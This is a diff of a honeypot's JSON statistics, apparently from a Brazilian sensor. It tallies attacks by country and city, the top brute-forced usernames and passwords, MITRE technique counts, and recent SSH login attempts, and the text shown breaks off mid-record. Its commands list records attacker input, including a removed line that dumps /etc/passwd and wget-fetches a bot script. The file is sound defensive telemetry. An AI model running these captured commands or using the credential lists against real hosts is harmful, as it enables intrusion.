@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-11-09T00:47:41.614779Z",
+  "generated_at": "2026-11-09T07:53:34.946089Z",
   "window": "30 days",
   "target": "137.131.150.77",
   "sensor_location": {
@@ -9,26 +9,26 @@
     "country": "Brazil"
   },
   "totals": {
-    "events": 178926,
-    "attackers": 1310,
-    "sessions": 46108,
+    "events": 180436,
+    "attackers": 1354,
+    "sessions": 47570,
     "samples": 0,
-    "countries": 77
+    "countries": 79
   },
   "countries": [
     {
       "iso2": "NL",
       "id": "528",
       "name": "The Netherlands",
-      "attacks": 97639,
-      "attackers": 101
+      "attacks": 97879,
+      "attackers": 103
     },
     {
       "iso2": "FR",
       "id": "250",
       "name": "France",
-      "attacks": 41809,
-      "attackers": 44
+      "attacks": 41839,
+      "attackers": 45
     },
     {
       "iso2": "IR",
@@ -48,113 +48,113 @@
       "iso2": "US",
       "id": "840",
       "name": "United States",
-      "attacks": 4852,
-      "attackers": 421
+      "attacks": 5313,
+      "attackers": 444
     },
     {
       "iso2": "AD",
       "id": "020",
       "name": "Andorra",
-      "attacks": 4836,
+      "attacks": 4840,
       "attackers": 15
     },
     {
       "iso2": "GB",
       "id": "826",
       "name": "United Kingdom",
-      "attacks": 2424,
-      "attackers": 120
+      "attacks": 2625,
+      "attackers": 123
     },
     {
       "iso2": "CH",
       "id": "756",
       "name": "Switzerland",
-      "attacks": 2298,
+      "attacks": 2303,
       "attackers": 4
     },
     {
       "iso2": "DE",
       "id": "276",
       "name": "Germany",
-      "attacks": 1894,
-      "attackers": 74
+      "attacks": 1916,
+      "attackers": 76
     },
     {
       "iso2": "BE",
       "id": "056",
       "name": "Belgium",
-      "attacks": 873,
-      "attackers": 51
+      "attacks": 875,
+      "attackers": 52
     },
     {
       "iso2": "CN",
       "id": "156",
       "name": "China",
-      "attacks": 727,
-      "attackers": 42
-    },
-    {
-      "iso2": "TR",
-      "id": "792",
-      "name": "Turkey",
-      "attacks": 571,
-      "attackers": 13
+      "attacks": 729,
+      "attackers": 43
     },
     {
       "iso2": "BR",
       "id": "076",
       "name": "Brazil",
-      "attacks": 466,
-      "attackers": 64
+      "attacks": 680,
+      "attackers": 72
+    },
+    {
+      "iso2": "TR",
+      "id": "792",
+      "name": "Turkey",
+      "attacks": 598,
+      "attackers": 14
     },
     {
       "iso2": "SG",
       "id": "702",
       "name": "Singapore",
-      "attacks": 310,
-      "attackers": 13
+      "attacks": 322,
+      "attackers": 15
+    },
+    {
+      "iso2": "VN",
+      "id": "704",
+      "name": "Vietnam",
+      "attacks": 262,
+      "attackers": 4
     },
     {
       "iso2": "HK",
       "id": "344",
       "name": "Hong Kong",
-      "attacks": 225,
+      "attacks": 231,
       "attackers": 14
     },
     {
       "iso2": "SE",
       "id": "752",
       "name": "Sweden",
-      "attacks": 190,
+      "attacks": 194,
       "attackers": 7
     },
     {
       "iso2": "KR",
       "id": "410",
       "name": "South Korea",
-      "attacks": 166,
-      "attackers": 27
-    },
-    {
-      "iso2": "VN",
-      "id": "704",
-      "name": "Vietnam",
-      "attacks": 154,
-      "attackers": 4
+      "attacks": 186,
+      "attackers": 29
     },
     {
       "iso2": "PE",
       "id": "604",
       "name": "Peru",
-      "attacks": 136,
+      "attacks": 144,
       "attackers": 2
     },
     {
       "iso2": "RU",
       "id": "643",
       "name": "Russia",
-      "attacks": 125,
-      "attackers": 39
+      "attacks": 127,
+      "attackers": 40
     },
     {
       "iso2": "UZ",
@@ -178,6 +178,13 @@
       "attackers": 29
     },
     {
+      "iso2": "IN",
+      "id": "356",
+      "name": "India",
+      "attacks": 65,
+      "attackers": 14
+    },
+    {
       "iso2": "CL",
       "id": "152",
       "name": "Chile",
@@ -192,18 +199,25 @@
       "attackers": 2
     },
     {
-      "iso2": "IN",
-      "id": "356",
-      "name": "India",
+      "iso2": "EG",
+      "id": "818",
+      "name": "Egypt",
       "attacks": 61,
-      "attackers": 12
+      "attackers": 2
+    },
+    {
+      "iso2": "UA",
+      "id": "804",
+      "name": "Ukraine",
+      "attacks": 58,
+      "attackers": 24
     },
     {
       "iso2": "CA",
       "id": "124",
       "name": "Canada",
-      "attacks": 54,
-      "attackers": 13
+      "attacks": 55,
+      "attackers": 14
     },
     {
       "iso2": "ID",
@@ -211,13 +225,6 @@
       "name": "Indonesia",
       "attacks": 54,
       "attackers": 10
-    },
-    {
-      "iso2": "UA",
-      "id": "804",
-      "name": "Ukraine",
-      "attacks": 54,
-      "attackers": 22
     },
     {
       "iso2": "BG",
@@ -248,11 +255,25 @@
       "attackers": 6
     },
     {
+      "iso2": "LU",
+      "id": "442",
+      "name": "Luxembourg",
+      "attacks": 29,
+      "attackers": 1
+    },
+    {
       "iso2": "CR",
       "id": "188",
       "name": "Costa Rica",
       "attacks": 28,
       "attackers": 1
+    },
+    {
+      "iso2": "AU",
+      "id": "036",
+      "name": "Australia",
+      "attacks": 25,
+      "attackers": 10
     },
     {
       "iso2": "MY",
@@ -262,18 +283,18 @@
       "attackers": 7
     },
     {
-      "iso2": "AU",
-      "id": "036",
-      "name": "Australia",
-      "attacks": 23,
-      "attackers": 9
-    },
-    {
       "iso2": "PK",
       "id": "586",
       "name": "Pakistan",
-      "attacks": 21,
-      "attackers": 10
+      "attacks": 23,
+      "attackers": 11
+    },
+    {
+      "iso2": "CO",
+      "id": "170",
+      "name": "Colombia",
+      "attacks": 20,
+      "attackers": 7
     },
     {
       "iso2": "IT",
@@ -311,13 +332,6 @@
       "attackers": 1
     },
     {
-      "iso2": "CO",
-      "id": "170",
-      "name": "Colombia",
-      "attacks": 12,
-      "attackers": 5
-    },
-    {
       "iso2": "IQ",
       "id": "368",
       "name": "Iraq",
@@ -351,6 +365,13 @@
       "name": "Finland",
       "attacks": 9,
       "attackers": 3
+    },
+    {
+      "iso2": "HN",
+      "id": "340",
+      "name": "Honduras",
+      "attacks": 9,
+      "attackers": 1
     },
     {
       "iso2": "NG",
@@ -442,13 +463,6 @@
       "name": "Lithuania",
       "attacks": 4,
       "attackers": 3
-    },
-    {
-      "iso2": "LU",
-      "id": "442",
-      "name": "Luxembourg",
-      "attacks": 4,
-      "attackers": 1
     },
     {
       "iso2": "MA",
@@ -563,8 +577,8 @@
       "country": "The Netherlands",
       "lat": 52.3676,
       "lon": 4.90414,
-      "attacks": 97555,
-      "attackers": 83
+      "attacks": 97792,
+      "attackers": 84
     },
     {
       "city": "Paris",
@@ -572,7 +586,7 @@
       "country": "France",
       "lat": 48.8575,
       "lon": 2.35138,
-      "attacks": 41596,
+      "attacks": 41597,
       "attackers": 29
     },
     {
@@ -599,7 +613,7 @@
       "country": "Andorra",
       "lat": 42.5063,
       "lon": 1.52184,
-      "attacks": 4836,
+      "attacks": 4840,
       "attackers": 15
     },
     {
@@ -608,7 +622,7 @@
       "country": "Switzerland",
       "lat": 47.3769,
       "lon": 8.54169,
-      "attacks": 2298,
+      "attacks": 2303,
       "attackers": 4
     },
     {
@@ -617,7 +631,7 @@
       "country": "United Kingdom",
       "lat": 52.2999,
       "lon": -0.613313,
-      "attacks": 1924,
+      "attacks": 2000,
       "attackers": 3
     },
     {
@@ -626,8 +640,8 @@
       "country": "United States",
       "lat": 37.3834,
       "lon": -121.983,
-      "attacks": 1567,
-      "attackers": 83
+      "attacks": 1590,
+      "attackers": 90
     },
     {
       "city": "Minkler",
@@ -644,8 +658,8 @@
       "country": "Germany",
       "lat": 50.1109,
       "lon": 8.68213,
-      "attacks": 1338,
-      "attackers": 54
+      "attacks": 1360,
+      "attackers": 56
     },
     {
       "city": "Brussels",
@@ -653,8 +667,17 @@
       "country": "Belgium",
       "lat": 50.8476,
       "lon": 4.35717,
-      "attacks": 869,
-      "attackers": 50
+      "attacks": 871,
+      "attackers": 51
+    },
+    {
+      "city": "London",
+      "iso2": "GB",
+      "country": "United Kingdom",
+      "lat": 51.5134,
+      "lon": -0.0890675,
+      "attacks": 601,
+      "attackers": 109
     },
     {
       "city": "Istanbul",
@@ -662,17 +685,8 @@
       "country": "Turkey",
       "lat": 41.0082,
       "lon": 28.9784,
-      "attacks": 557,
+      "attacks": 582,
       "attackers": 6
-    },
-    {
-      "city": "London",
-      "iso2": "GB",
-      "country": "United Kingdom",
-      "lat": 51.4968,
-      "lon": -0.018337,
-      "attacks": 478,
-      "attackers": 107
     },
     {
       "city": "Augsburg",
@@ -682,6 +696,15 @@
       "lon": 10.9161,
       "attacks": 446,
       "attackers": 3
+    },
+    {
+      "city": "Creston",
+      "iso2": "US",
+      "country": "United States",
+      "lat": 41.0586,
+      "lon": -94.3614,
+      "attacks": 329,
+      "attackers": 1
     },
     {
       "city": "Chicago",
@@ -698,8 +721,8 @@
       "country": "United States",
       "lat": 40.8054,
       "lon": -74.0241,
-      "attacks": 252,
-      "attackers": 9
+      "attacks": 255,
+      "attackers": 10
     },
     {
       "city": "Singapore (Central Area)",
@@ -709,6 +732,15 @@
       "lon": 103.854,
       "attacks": 232,
       "attackers": 1
+    },
+    {
+      "city": "Massy",
+      "iso2": "FR",
+      "country": "France",
+      "lat": 48.7217,
+      "lon": 2.28306,
+      "attacks": 211,
+      "attackers": 7
     },
     {
       "city": "Ribeir\u00e3o Preto",
@@ -725,17 +757,17 @@
       "country": "Sweden",
       "lat": 59.3293,
       "lon": 18.0686,
-      "attacks": 190,
+      "attacks": 194,
       "attackers": 7
     },
     {
-      "city": "Massy",
-      "iso2": "FR",
-      "country": "France",
-      "lat": 48.7217,
-      "lon": 2.28306,
-      "attacks": 182,
-      "attackers": 6
+      "city": "Qu\u1eadn B\u1ed1n",
+      "iso2": "VN",
+      "country": "Vietnam",
+      "lat": 10.7644,
+      "lon": 106.696,
+      "attacks": 172,
+      "attackers": 1
     },
     {
       "city": "Lima Cercado (Fundo Monterrico Chico)",
@@ -743,8 +775,35 @@
       "country": "Peru",
       "lat": -12.0875,
       "lon": -76.9735,
-      "attacks": 136,
+      "attacks": 144,
       "attackers": 2
+    },
+    {
+      "city": "Los Angeles",
+      "iso2": "US",
+      "country": "United States",
+      "lat": 34.0549,
+      "lon": -118.243,
+      "attacks": 144,
+      "attackers": 39
+    },
+    {
+      "city": "Ann Arbor (Old West Side)",
+      "iso2": "US",
+      "country": "United States",
+      "lat": 42.2809,
+      "lon": -83.7489,
+      "attacks": 143,
+      "attackers": 29
+    },
+    {
+      "city": "Hanover (Cedar Knolls)",
+      "iso2": "US",
+      "country": "United States",
+      "lat": 40.8218,
+      "lon": -74.45,
+      "attacks": 135,
+      "attackers": 30
     },
     {
       "city": "Jinrongjie (Xicheng District)",
@@ -756,31 +815,13 @@
       "attackers": 3
     },
     {
-      "city": "Hanover (Cedar Knolls)",
+      "city": "Pleasanton",
       "iso2": "US",
       "country": "United States",
-      "lat": 40.8218,
-      "lon": -74.45,
-      "attacks": 130,
-      "attackers": 30
-    },
-    {
-      "city": "Ann Arbor (Old West Side)",
-      "iso2": "US",
-      "country": "United States",
-      "lat": 42.2809,
-      "lon": -83.7489,
+      "lat": 37.6951,
+      "lon": -121.9,
       "attacks": 128,
-      "attackers": 26
-    },
-    {
-      "city": "Los Angeles",
-      "iso2": "US",
-      "country": "United States",
-      "lat": 34.0549,
-      "lon": -118.243,
-      "attacks": 128,
-      "attackers": 38
+      "attackers": 48
     },
     {
       "city": "Council Bluffs",
@@ -790,15 +831,6 @@
       "lon": -95.8608,
       "attacks": 124,
       "attackers": 2
-    },
-    {
-      "city": "Pleasanton",
-      "iso2": "US",
-      "country": "United States",
-      "lat": 37.6951,
-      "lon": -121.9,
-      "attacks": 122,
-      "attackers": 47
     },
     {
       "city": "Tehr\u0101n",
@@ -819,6 +851,15 @@
       "attackers": 2
     },
     {
+      "city": "Quarry Bay",
+      "iso2": "HK",
+      "country": "Hong Kong",
+      "lat": 22.2862,
+      "lon": 114.214,
+      "attacks": 108,
+      "attackers": 1
+    },
+    {
       "city": "Chengdu",
       "iso2": "CN",
       "country": "China",
@@ -828,12 +869,21 @@
       "attackers": 2
     },
     {
-      "city": "Quarry Bay",
-      "iso2": "HK",
-      "country": "Hong Kong",
-      "lat": 22.2862,
-      "lon": 114.214,
-      "attacks": 102,
+      "city": "Chapec\u00f3",
+      "iso2": "BR",
+      "country": "Brazil",
+      "lat": -27.0964,
+      "lon": -52.6183,
+      "attacks": 98,
+      "attackers": 1
+    },
+    {
+      "city": "Belford Roxo",
+      "iso2": "BR",
+      "country": "Brazil",
+      "lat": -22.7642,
+      "lon": -43.3994,
+      "attacks": 90,
       "attackers": 1
     },
     {
@@ -842,16 +892,16 @@
       "country": "Vietnam",
       "lat": 21.0278,
       "lon": 105.834,
-      "attacks": 87,
+      "attacks": 89,
       "attackers": 2
     },
     {
       "city": "S\u00e3o Paulo",
       "iso2": "BR",
       "country": "Brazil",
-      "lat": -23.5475,
-      "lon": -46.6361,
-      "attacks": 77,
+      "lat": -23.5558,
+      "lon": -46.6396,
+      "attacks": 83,
       "attackers": 8
     },
     {
@@ -860,8 +910,8 @@
       "country": "The Netherlands",
       "lat": 50.8933,
       "lon": 6.05805,
-      "attacks": 72,
-      "attackers": 11
+      "attacks": 74,
+      "attackers": 12
     },
     {
       "city": "Budapest",
@@ -882,21 +932,30 @@
       "attackers": 4
     },
     {
-      "city": "Qu\u1eadn B\u1ed1n",
-      "iso2": "VN",
-      "country": "Vietnam",
-      "lat": 10.7644,
-      "lon": 106.696,
-      "attacks": 66,
-      "attackers": 1
-    },
-    {
       "city": "Baku",
       "iso2": "AZ",
       "country": "Azerbaijan",
       "lat": 40.4093,
       "lon": 49.8671,
       "attacks": 63,
+      "attackers": 2
+    },
+    {
+      "city": "Denver",
+      "iso2": "US",
+      "country": "United States",
+      "lat": 39.7392,
+      "lon": -104.99,
+      "attacks": 62,
+      "attackers": 3
+    },
+    {
+      "city": "Ash-Shaykh Z\u0101yid",
+      "iso2": "EG",
+      "country": "Egypt",
+      "lat": 30.0616,
+      "lon": 31.0295,
+      "attacks": 61,
       "attackers": 2
     },
     {
@@ -954,6 +1013,15 @@
       "attackers": 9
     },
     {
+      "city": "Dublin",
+      "iso2": "US",
+      "country": "United States",
+      "lat": 40.0992,
+      "lon": -83.1141,
+      "attacks": 56,
+      "attackers": 4
+    },
+    {
       "city": "Hwaseong-si (Bansong-dong)",
       "iso2": "KR",
       "country": "South Korea",
@@ -963,13 +1031,22 @@
       "attackers": 1
     },
     {
-      "city": "Dublin",
+      "city": "Singapore (Pioneer)",
+      "iso2": "SG",
+      "country": "Singapore",
+      "lat": 1.32123,
+      "lon": 103.695,
+      "attacks": 55,
+      "attackers": 4
+    },
+    {
+      "city": "Ashburn",
       "iso2": "US",
       "country": "United States",
-      "lat": 40.0992,
-      "lon": -83.1141,
-      "attacks": 52,
-      "attackers": 4
+      "lat": 39.0438,
+      "lon": -77.4874,
+      "attacks": 50,
+      "attackers": 29
     },
     {
       "city": "Phoenix",
@@ -977,8 +1054,8 @@
       "country": "United States",
       "lat": 33.4483,
       "lon": -112.073,
-      "attacks": 48,
-      "attackers": 13
+      "attacks": 50,
+      "attackers": 14
     },
     {
       "city": "Sopot",
@@ -1008,24 +1085,6 @@
       "attackers": 1
     },
     {
-      "city": "Singapore (Pioneer)",
-      "iso2": "SG",
-      "country": "Singapore",
-      "lat": 1.32123,
-      "lon": 103.695,
-      "attacks": 45,
-      "attackers": 3
-    },
-    {
-      "city": "Ashburn",
-      "iso2": "US",
-      "country": "United States",
-      "lat": 39.0438,
-      "lon": -77.4874,
-      "attacks": 44,
-      "attackers": 25
-    },
-    {
       "city": "Frankfurt am Main (Innenstadt I)",
       "iso2": "DE",
       "country": "Germany",
@@ -1051,83 +1110,38 @@
       "lon": 106.859,
       "attacks": 40,
       "attackers": 5
-    },
-    {
-      "city": "Ebersbach an der Fils",
-      "iso2": "DE",
-      "country": "Germany",
-      "lat": 48.716,
-      "lon": 9.5236,
-      "attacks": 35,
-      "attackers": 1
-    },
-    {
-      "city": "Joinville",
-      "iso2": "BR",
-      "country": "Brazil",
-      "lat": -26.3044,
-      "lon": -48.8464,
-      "attacks": 34,
-      "attackers": 3
-    },
-    {
-      "city": "Moscow",
-      "iso2": "RU",
-      "country": "Russia",
-      "lat": 55.8032,
-      "lon": 37.5695,
-      "attacks": 33,
-      "attackers": 7
-    },
-    {
-      "city": "Yangpu (Yangpu Qu)",
-      "iso2": "CN",
-      "country": "China",
-      "lat": 31.2999,
-      "lon": 121.508,
-      "attacks": 33,
-      "attackers": 1
-    },
-    {
-      "city": "Denver",
-      "iso2": "US",
-      "country": "United States",
-      "lat": 39.7392,
-      "lon": -104.99,
-      "attacks": 32,
-      "attackers": 3
     }
   ],
-  "located_events": 178280,
+  "located_events": 179764,
   "collecting_since": "2026-11-03T01:41:35.403000Z",
   "passwords": [
     {
       "label": "(empty)",
-      "value": 40465
+      "value": 40537
     },
     {
       "label": "123456",
-      "value": 2194
+      "value": 2198
     },
     {
       "label": "123",
-      "value": 1101
+      "value": 1102
     },
     {
       "label": "1234",
-      "value": 841
+      "value": 842
     },
     {
       "label": "12345678",
-      "value": 556
+      "value": 557
     },
     {
       "label": "password",
-      "value": 490
+      "value": 491
     },
     {
       "label": "root",
-      "value": 489
+      "value": 490
     },
     {
       "label": "1",
@@ -1135,15 +1149,15 @@
     },
     {
       "label": "12345",
-      "value": 415
+      "value": 416
     },
     {
       "label": "admin",
-      "value": 309
+      "value": 312
     },
     {
       "label": "123456789",
-      "value": 300
+      "value": 301
     },
     {
       "label": "123123",
@@ -1153,15 +1167,15 @@
   "usernames": [
     {
       "label": "root",
-      "value": 28361
+      "value": 28462
     },
     {
       "label": "ubuntu",
-      "value": 6785
+      "value": 6786
     },
     {
       "label": "admin",
-      "value": 2813
+      "value": 2839
     },
     {
       "label": "user",
@@ -1184,20 +1198,20 @@
       "value": 542
     },
     {
+      "label": "postgres",
+      "value": 457
+    },
+    {
       "label": "debian",
       "value": 456
     },
     {
-      "label": "postgres",
-      "value": 456
+      "label": "support",
+      "value": 420
     },
     {
       "label": "minecraft",
       "value": 412
-    },
-    {
-      "label": "support",
-      "value": 409
     }
   ],
   "commands": [
@@ -1222,6 +1236,10 @@
       "technique": "System Information Discovery"
     },
     {
+      "label": "/bin/busybox",
+      "value": 33
+    },
+    {
       "label": "/bin/./uname -s -v -n -r -m",
       "value": 19,
       "technique_id": "T1082",
@@ -1229,48 +1247,42 @@
     },
     {
       "label": "enable",
-      "value": 8
+      "value": 11
+    },
+    {
+      "label": "sh .k",
+      "value": 9
+    },
+    {
+      "label": "sh",
+      "value": 7
+    },
+    {
+      "label": "shell",
+      "value": 7
+    },
+    {
+      "label": "echo Zx9Qp2Lm7K",
+      "value": 6
+    },
+    {
+      "label": "system",
+      "value": 6
     },
     {
       "label": "echo xsec",
       "value": 5
     },
     {
-      "label": "ls -la /dev/shm/.bf8c 2>&1",
+      "label": "ls -la /dev/shm/.5e01 2>&1",
       "value": 5
-    },
-    {
-      "label": "ls -la /var/run/.76e6 2>&1",
-      "value": 5
-    },
-    {
-      "label": "ls -la /var/tmp/.b2a7 2>&1",
-      "value": 5
-    },
-    {
-      "label": "shell",
-      "value": 5
-    },
-    {
-      "label": "sh",
-      "value": 4
-    },
-    {
-      "label": "whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh",
-      "value": 4,
-      "technique_id": "T1003.008",
-      "technique": "OS Credential Dumping: /etc/passwd and /etc/shadow"
-    },
-    {
-      "label": "ls -l q",
-      "value": 3
     }
   ],
   "pairs": [
     {
       "username": "root",
       "password": "",
-      "tries": 14144
+      "tries": 14191
     },
     {
       "username": "ubuntu",
@@ -1280,7 +1292,7 @@
     {
       "username": "admin",
       "password": "",
-      "tries": 1219
+      "tries": 1225
     },
     {
       "username": "user",
@@ -1318,14 +1330,14 @@
       "tries": 228
     },
     {
+      "username": "support",
+      "password": "",
+      "tries": 209
+    },
+    {
       "username": "minecraft",
       "password": "",
       "tries": 206
-    },
-    {
-      "username": "support",
-      "password": "",
-      "tries": 204
     },
     {
       "username": "dev",
@@ -1342,630 +1354,630 @@
     {
       "id": "T1110",
       "name": "Brute Force",
-      "events": 81779
+      "events": 81963
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
-      "events": 2796
-    },
-    {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "events": 827
+      "events": 2860
     },
     {
       "id": "T1552.001",
       "name": "Credentials In Files",
-      "events": 653
+      "events": 970
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "events": 829
     },
     {
       "id": "T1021.004",
       "name": "Remote Services: SSH",
-      "events": 236
+      "events": 243
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
-      "events": 38
+      "events": 92
     },
     {
       "id": "T1003.008",
       "name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
-      "events": 6
+      "events": 7
     },
     {
       "id": "T1087.001",
       "name": "Account Discovery: Local Account",
-      "events": 3
+      "events": 4
     }
   ],
   "recent": [
     {
-      "at": "2026-11-09T00:45:07.648000Z",
-      "ip": "176.53.159.x",
-      "country": "TR",
-      "kind": "ssh.auth_attempt",
-      "username": "support",
-      "password": "support",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:45:07.442000Z",
-      "ip": "176.53.159.x",
-      "country": "TR",
-      "kind": "ssh.auth_attempt",
-      "username": "support",
+      "at": "2026-11-09T07:33:59.612000Z",
+      "ip": "78.153.140.x",
+      "country": "GB",
+      "kind": "http.login_attempt",
+      "username": "",
       "password": "",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:43:49.690000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:31:33.103000Z",
+      "ip": "2.57.121.x",
+      "country": "GB",
+      "kind": "ssh.auth_attempt",
+      "username": "colson",
+      "password": "colson12345",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:31:32.896000Z",
+      "ip": "2.57.121.x",
+      "country": "GB",
+      "kind": "ssh.auth_attempt",
+      "username": "colson",
+      "password": "colson1234",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:31:32.692000Z",
+      "ip": "2.57.121.x",
+      "country": "GB",
+      "kind": "ssh.auth_attempt",
+      "username": "colson",
+      "password": "colson123",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:31:32.488000Z",
+      "ip": "2.57.121.x",
+      "country": "GB",
+      "kind": "ssh.auth_attempt",
+      "username": "colson",
+      "password": "colson1",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:31:32.284000Z",
+      "ip": "2.57.121.x",
+      "country": "GB",
+      "kind": "ssh.auth_attempt",
+      "username": "colson",
+      "password": "colson",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:31:32.080000Z",
+      "ip": "2.57.121.x",
+      "country": "GB",
+      "kind": "ssh.auth_attempt",
+      "username": "colson",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-09T07:23:02.684000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
       "username": "root",
-      "password": "Admin@9000",
+      "password": "admin",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:43:48.928000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "root",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:43:20.706000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "deploy",
-      "password": "1234567890",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:43:19.441000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "deploy",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:43:14.510000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "dell",
-      "password": "P@ssw0rd",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:43:12.839000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "dell",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:43:06.305000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "user",
-      "password": "2024@user",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:43:04.574000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "user",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:58.725000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "test",
-      "password": "Qwerty",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:57.058000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "test",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:52.078000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "aa",
-      "password": "aa",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:49.969000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "aa",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:44.090000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "root",
-      "password": "1qaz@2wsx",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:42.269000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:23:02.341000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
       "username": "root",
       "password": "",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:39.410000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "share",
-      "password": "share",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:36.525000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "share",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:30.266000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "RPM",
-      "password": "RPM",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:28.354000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
-      "kind": "ssh.auth_attempt",
-      "username": "RPM",
-      "password": "",
-      "command": ""
-    },
-    {
-      "at": "2026-11-09T00:42:25.029000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:57.885000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
       "username": "root",
-      "password": "ddd",
+      "password": "administrator",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:22.506000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:57.526000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
       "username": "root",
       "password": "",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:20.362000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:54.151000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
       "username": "root",
-      "password": "MoeClub.org",
+      "password": "default",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:17.870000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:53.890000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
       "username": "root",
       "password": "",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:14.064000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:49.433000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
-      "username": "user1",
-      "password": "user1",
+      "username": "root",
+      "password": "web",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:10.210000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:48.242000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
-      "username": "user1",
+      "username": "root",
       "password": "",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:06.386000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:45.236000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
-      "username": "steven",
-      "password": "12345",
+      "username": "root",
+      "password": "www",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:42:01.986000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:44.886000Z",
+      "ip": "41.33.45.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
-      "username": "steven",
+      "username": "root",
       "password": "",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:41:59.514000Z",
-      "ip": "77.239.124.x",
-      "country": "FR",
+      "at": "2026-11-09T07:22:40.958000Z",
+      "ip": "82.129.237.x",
+      "country": "EG",
       "kind": "ssh.auth_attempt",
-      "username": "ubuntu",
-      "password": "password123!",
+      "username": "root",
+      "password": "host",
       "command": ""
     },
     {
-      "at": "2026-11-09T00:41:57.286000Z",
-      "ip": "77.239.124.x",
